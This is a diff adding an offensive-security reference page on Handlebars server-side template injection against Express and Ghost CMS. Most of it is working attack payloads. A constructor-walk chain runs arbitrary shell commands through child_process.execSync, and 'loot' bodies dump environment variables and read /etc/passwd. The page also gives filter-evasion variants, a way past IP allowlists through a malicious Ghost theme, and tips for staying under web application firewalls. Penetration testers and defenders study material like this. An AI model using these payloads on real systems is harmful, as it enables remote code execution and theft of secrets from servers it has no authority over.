@@ -1,0 +1,155 @@
+---
+title: Handlebars (Node - Express, Ghost)
+description: SSTI exploitation in Handlebars - prototype pollution chains, require via NodeJS internals, payloads for Express/Ghost.
+mitre: [T1190, T1059.007]
+d3fend: [D3-EAL]
+impact: [ServerSideEval, RCE]
+sidebar:
+  order: 8
+  label: Handlebars
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Handlebars is logic-less by design - no arithmetic, no method calls in templates. RCE requires escaping through helpers, prototype pollution, or the underlying compile mechanism.
+
+```
+# Confirm Handlebars (NOT Jinja2/Twig - different arithmetic behavior)
+{{7*7}}                                      # → 7*7 literally (Handlebars doesn't do arithmetic)
+{{#each (lookup this "constructor")}}        # error or unusual output if Handlebars
+
+# RCE - constructor walk (Handlebars <= 4.0.13)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+Success indicator: `uid=` line in output. The payload form is uglier than other engines because Handlebars deliberately doesn't expose method-call syntax.
+
+## Where this engine lives
+
+- **Express.js** - Handlebars (via `hbs` or `express-handlebars` package) is one of Express's main view engines.
+- **Ghost CMS** - Themes are Handlebars. SSTI in admin theme upload features is the classic path.
+- **Slack message templates** - some legacy Slack-bot frameworks use Handlebars for outbound message formatting.
+- **AWS Lambda** - Handlebars-rendered email templates in SES configurations.
+- **Custom Node apps** - anything `require('handlebars').compile(user_input)`.
+
+## Step 1 - Confirm and orient
+
+Handlebars's logic-less design means arithmetic probes don't work the way they do elsewhere:
+
+```
+{{7*7}}                          # → 7*7 literally (NOT 49)
+{{#if true}}YES{{/if}}           # → YES        confirms control flow works
+{{#each [1,2,3]}}{{this}}{{/each}}  # → 123 if Handlebars
+```
+
+`{{#if}}` and `{{#each}}` are the diagnostic - `{{7*7}}` failing to evaluate is a fingerprint for Handlebars, not evidence the engine is absent.
+
+If `{{#if true}}YES{{/if}}` returns `YES`, you have Handlebars and can probe escape paths.
+
+## Step 2 - Constructor walk (Handlebars ≤ 4.0.13)
+
+The original Handlebars SSTI from 2015 used the `{{#with}}` block helper to walk JavaScript prototype chains. Patched in 4.0.14 (Aug 2017) and again in 4.7.7 for related issues, but unpatched deployments are still common - especially in legacy enterprise apps and embedded Node services.
+
+Full payload form in the TL;DR above. Compact version (when whitespace doesn't matter):
+
+```
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+```
+
+Replace `'id'` with any command. The payload returns the stdout of `execSync` directly into the template output.
+
+## Step 3 - `lookup` helper abuse
+
+Handlebars's built-in `lookup` helper accesses properties dynamically. Combined with constructor access, it reaches `Function`:
+
+```
+{{lookup (lookup this "constructor") "constructor"}}
+```
+
+This reaches the `Function` constructor - calling `Function("body")()` is equivalent to `eval`. The exact escape requires combining `lookup` with `#with` (as above) since Handlebars doesn't have direct function-call syntax in expressions.
+
+## Step 4 - Helper-registration abuse
+
+If the application allows custom helper registration through user input (rare but devastating when present), the helper itself executes Node.js:
+
+```javascript
+// Vulnerable pattern in app code
+Handlebars.registerHelper(userInput, function() {
+  return eval(userBody);
+});
+```
+
+The Handlebars-side payload is just the helper name in a normal expression - the application's evaluation of the helper body is where the bug lives.
+
+## Step 5 - Loot
+
+Handlebars doesn't expose application config directly. Loot comes through the RCE path:
+
+```javascript
+// After RCE via constructor walk, the payload body can be:
+return JSON.stringify(process.env);                           // env vars
+return require('fs').readFileSync('/etc/passwd','utf8');      // file read
+return Object.keys(global);                                    // global Node namespace
+return require('child_process').execSync('id').toString();    // command output
+```
+
+Embed any of those in the `"return ..."` slot of the constructor-walk payload.
+
+## Step 6 - Ghost CMS specifics
+
+Ghost themes are Handlebars `.hbs` files. SSTI in Ghost typically requires admin access to upload a malicious theme - at which point you also have access to the admin API directly, so SSTI is somewhat redundant.
+
+Where Ghost SSTI is operationally useful: bypassing IP allowlists on admin endpoints. If you reach the theme upload but can't make admin API calls, a malicious `.hbs` file with the constructor-walk payload gives you Node-side command execution that the admin API alone wouldn't.
+
+## Filter-aware variants
+
+```
+# Constructor access via dot vs bracket
+{{lookup this "__proto__"}}                  # walk prototype chain
+
+# Whitespace insertion (Handlebars is whitespace-tolerant inside helpers)
+{{#with "s"  as  |string|}}                  # extra spaces survive
+```
+
+Most Handlebars SSTI mitigations focus on patching the constructor-walk path. Filter-based mitigations are less common because Handlebars's logic-less design already restricts most things.
+
+## Detection-only payloads
+
+```
+{{#if true}}YES{{/if}}                       # confirms Handlebars (returns YES)
+{{#each [1,2,3]}}{{this}}{{/each}}           # confirms Handlebars (returns 123)
+{{lookup this "constructor"}}                # returns function repr if constructor walk reachable
+{{#with "s" as |x|}}{{x.length}}{{/with}}    # returns 1 - proves `as |x|` syntax works
+```
+
+`{{#with "s" as |x|}}{{x.length}}{{/with}}` returning `1` is the cleanest indicator that the constructor-walk path will likely work - that syntax was added in Handlebars 3.x and is required for the escape.
+
+## Notes
+
+- **Handlebars 4.7.7+** patches the known constructor-walk paths. Unpatched 4.0.x-4.6.x and all 3.x versions are vulnerable.
+- **`noEscape: true`** is a Handlebars option that disables HTML escaping. It doesn't enable RCE on its own but combined with reflective sinks it creates XSS in addition to SSTI.
+- **Strict mode** (`strict: true`) makes references to missing variables throw instead of returning empty. This breaks some payload variants but not the constructor walk.
+- **Mustache vs Handlebars** - Mustache is the spec Handlebars extends. Pure Mustache (e.g. `mustache.js`) is even more restrictive and doesn't have the `#with` syntax - Mustache-only sinks are usually safe from this attack.
+
+<Aside type="caution">
+The constructor-walk payload is loud - it's a well-known signature that triggers most Node.js application firewalls. If discretion matters, restrict to detection probes (`{{#if true}}YES{{/if}}`) until you confirm there's no WAF in front of the application.
+</Aside>
